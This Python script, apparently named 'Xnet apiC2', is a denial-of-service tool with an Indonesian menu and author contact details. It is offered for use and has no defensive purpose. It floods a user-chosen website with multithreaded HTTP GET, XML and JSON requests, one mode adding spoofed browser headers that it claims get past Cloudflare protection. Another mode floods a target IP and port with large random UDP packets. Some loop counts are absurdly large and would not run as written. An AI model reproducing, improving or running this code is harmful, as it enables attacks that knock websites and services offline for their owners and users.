import os
import requests
import threading
import time
import socket
import random
import pyfiglet
from termcolor import colored
os.system('clear')
figlet_text = pyfiglet.figlet_format("Xnet apiC2", font="slant")
colored_figlet = colored(figlet_text, color='magenta')
colored_by = colored("[ By AlynnMD ]", color='red')
colored_by = colored("PLISS KAK JANGAN CURI FITUR DDOS NYA :(", color='yellow')
print(colored_figlet)
print(colored_by)
XML_PAYLOAD = """
<request>
    <data>
        <item>value1</item>
        <item>value2</item>
        <item>value3</item>
    </data>
</request>
"""
JSON_PAYLOAD = {
    "request": {
        "data": [
            {"item": "value1"},
            {"item": "value2"},
            {"item": "value3"}
        ]
    }
}
def send_request(url, headers=None):
    try:
        response = requests.get(url, headers=headers, timeout=5)
        print(f"Response: {response.status_code} from {url}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
def send_xml_request(url, headers=None):
    try:
        response = requests.post(url, data=XML_PAYLOAD, headers=headers, timeout=5)
        print(f"Response: {response.status_code} from {url}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
def send_json_request(url, headers=None):
    try:
        response = requests.post(url, json=JSON_PAYLOAD, headers=headers, timeout=5)
        print(f"Response: {response.status_code} from {url}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
def mix_attack(url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        threads = []
        for _ in range(2000000000000):
            thread = threading.Thread(target=send_request, args=(url,))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        time.sleep(0.001)
def flood_attack(url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        threads = []
        for _ in range(5000000000):
            thread = threading.Thread(target=send_request, args=(url,))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        time.sleep(0.001)
def ninja_attack(url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        threads = []
        for _ in range(100000000000000000000000):
            thread = threading.Thread(target=send_request, args=(url,))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
def xml_attack(url, duration=120, requests_per_batch=9000000000000000):
    print(f"Memulai serangan XML selama {duration} detik dengan {requests_per_batch} request per batch.")
    end_time = time.time() + duration
    while time.time() < end_time:
        threads = []
        for _ in range(requests_per_batch):
            thread = threading.Thread(target=send_xml_request, args=(url,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()
        time.sleep(0.005)
    print("Serangan XML selesai.")
def udp_attack(target_ip, target_port, duration=60):
    print(f"Memulai serangan UDP selama {duration} detik ke {target_ip}:{target_port}.")
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end_time:
        sock.sendto(random._urandom(600000), (target_ip, target_port)) 
    sock.close()
    print("Serangan UDP selesai.")
def cloudflare_attack(url, duration=60):
    print(f"Memulai serangan Cloudflare selama {duration} detik ke {url}.")
    headers = {
        'User-Agent': random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]),
        'Referer': 'https://www.google.com/',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
        'Accept-Encoding': 'gzip, deflate, br'
    }
    end_time = time.time() + duration
    while time.time() < end_time:
        threads = []
        for _ in range(500000):
            thread = threading.Thread(target=send_request, args=(url, headers))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        time.sleep(0.001)
    print("Serangan Cloudflare selesai.")
def main():
    print("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓") 
    print("┃[+] Mix                        ┃")                        
    print("┃[+] Flood                      ┃") 
    print("┃[+] Ninja                      ┃") 
    print("┃[+] XML                        ┃") 
    print("┃[+] UDP                        ┃") 
    print("┃[+] Cloudflare                 ┃") 
    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━─━━┛") 
    print("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓") 
    print("┃ TikTok : @Alynn               ┃")
    print("┃ Telegram : t.me/alinchan12    ┃")
    print("┃ WhatsApp : 6285927217404      ┃")
    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━─━━┛") 
    try:
        choice = int(input("Masukkan pilihan (1-6): "))
    except ValueError:
        print("Masukkan angka yang valid!")
        return
    url = input("Masukkan URL website: ").strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    if choice == 6:
        print(f"Mode Cloudflare aktif: Mengirim request dengan header khusus untuk menghindari perlindungan Cloudflare ke {url}.")
        cloudflare_attack(url)
    elif choice == 5:
        target_ip = input("Masukkan IP target: ")
        target_port = int(input("Masukkan port target: "))
        udp_attack(target_ip, target_port)
    elif choice == 4:
        print(f"Mode XML aktif: Mengirim payload XML/JSON selama 10 detik ke {url}.")
        xml_attack(url)
    elif choice == 3:
        try:
            duration = int(input("Masukkan durasi maksimal (detik): "))
            ninja_attack(url, duration)
        except ValueError:
            print("Masukkan durasi yang valid!")
    elif choice == 2:
        try:
            duration = int(input("Masukkan durasi maksimal (detik): "))
            flood_attack(url, duration)
        except ValueError:
            print("Masukkan durasi yang valid!")
    elif choice == 1:
        try:
            duration = int(input("Masukkan durasi maksimal (detik): "))
            mix_attack(url, duration)
        except ValueError:
            print("Masukkan durasi yang valid!")
    else:
        print("Pilihan tidak valid!")
if __name__ == "__main__":
    main()